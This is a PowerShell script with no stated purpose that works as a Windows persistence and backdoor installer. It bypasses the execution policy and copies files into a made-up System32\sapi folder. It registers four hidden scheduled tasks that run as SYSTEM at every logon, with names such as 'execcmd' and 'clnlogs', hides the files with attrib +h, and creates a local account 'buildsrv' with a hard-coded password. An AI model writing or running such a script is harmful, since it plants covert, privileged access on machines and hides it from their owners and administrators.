Set-ExecutionPolicy -Scope Process Bypass

function LogStr {
param (
  [string]$str,
  [string]$color = 'Red'
 )
	Write-Host $str -Foreground $color
}

function Install-ScriptTask {
param (
  [string]$scriptname,
  [string]$scriptpath,
  [string]$taskname
 )
	$action = New-ScheduledTaskAction -Execute $scriptpath 
	$trigger = New-ScheduledTaskTrigger -AtLogOn
	$principal = New-ScheduledTaskPrincipal -UserID "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
	$settings = New-ScheduledTaskSettingsSet -MultipleInstances Parallel -Hidden -Priority 1
	$task = New-ScheduledTask -Action $action -Principal $principal -Trigger $trigger -Settings $settings


	Register-ScheduledTask $taskname -InputObject $task
	Start-ScheduledTask -TaskName $taskname

	LogStr "Hiding files..."
	LogStr "Invoke-Command { attrib +h $scriptpath }"
	Invoke-Command { attrib +h $scriptpath }
}

$tempDir = Join-Path $env:TEMPTEMP "install"
Get-ChildItem $tempDir

$batchfile = Join-Path $tempDir "cmd.bat"



start-process "cmd.exe" "/c $batchfile"

LogStr "Copying scripts..."


$files = Join-Path $tempDir "*.*"
Copy-Item $files "c:\Windows\System32\sapi"  -Verbose


LogStr "Installing tasks..."
Install-ScriptTask "sadm.bat" "c:\Windows\System32\sapi\sadm.bat" "aadmusr"
Install-ScriptTask "ssdown.bat" "c:\Windows\System32\sapi\ssdown.bat" "ssdown"
Install-ScriptTask "execcmd.bat" "c:\Windows\System32\sapi\execcmd.bat" "execcmd"
Install-ScriptTask "clnlogs.bat" "c:\Windows\System32\sapi\clnlogs.bat" "clnlogs"

LogStr "Invoke-Command { attrib +h c:\Windows\System32\sapi }"
Invoke-Command { attrib +h c:\Windows\System32\sapi }

Invoke-Command { net user buildsrv SecretTest123! /add }
